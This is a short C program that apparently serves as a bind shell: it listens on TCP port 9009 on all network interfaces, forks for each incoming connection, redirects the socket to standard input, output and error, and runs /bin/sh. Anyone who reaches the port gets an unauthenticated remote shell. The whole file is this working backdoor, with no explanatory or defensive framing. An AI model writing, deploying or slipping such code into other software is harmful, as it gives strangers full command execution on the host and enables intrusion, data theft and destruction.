#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#define PORT 9009 // Port number

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addlen = sizeof(address);
    char buffer[1024] = {0};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind socket to address and port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d\n", PORT);

    while (1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addlen)) < 0) {
            perror("Accept failed");
            continue;
        }

        printf("Connection established\n");

        // Spawn new process
        pid_t pid = fork();
        if (pid < 0) {
            perror("Fork failed");
            close(new_socket);
            continue;
        }

        if (pid == 0) {
            close(server_fd);

            // Duplicate socket to stdin, stdout, stderr
            dup2(new_socket, STDIN_FILENO);
            dup2(new_socket, STDOUT_FILENO);
            dup2(new_socket, STDERR_FILENO);

            // Execute shell
            execl("/bin/sh", "/bin/sh", NULL);


            perror("execl failed");
            exit(EXIT_FAILURE);
        } else {
            close(new_socket);
        }
    }

    return 0;
}
